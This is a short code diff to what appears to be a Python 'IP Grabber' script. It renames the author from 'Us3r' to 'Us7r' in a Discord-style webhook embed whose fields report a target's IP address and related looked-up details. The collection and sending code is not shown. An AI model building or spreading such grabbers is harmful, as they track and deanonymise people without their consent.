@@ -25,12 +25,12 @@ headers = {
 
 
 embed = {
-        "username": "IP Grabber by Us3r ",
+        "username": "IP Grabber by Us7r ",
         "avatar_url": "https://zupimages.net/viewer.php?id=21/23/qqh5.gif",
         "embeds": [
     {
       "title": "My Github",
-      "url": "https://github.com/Us3rWeb",
+      "url": "https://github.com/Us7rWeb",
       "color": 0x0c0303,
       "fields": [
         {"name": "IP :", "value": info[liste[0]]},
@@ -47,14 +47,14 @@ embed = {
       
       ],
       "author": {
-        "name": "Us3r",
-        "url": "https://github.com/Us3rWeb",
+        "name": "Us7r",
+        "url": "https://github.com/Us7rWeb",
         "icon_url": "https://zupimages.net/viewer.php?id=21/23/qqh5.gif"
       
       
       },
       "footer": {
-        "text": "IP Grabber Us3r"
+        "text": "IP Grabber Us7r"
       },
       "image": {
           "url" : info[liste[17]]
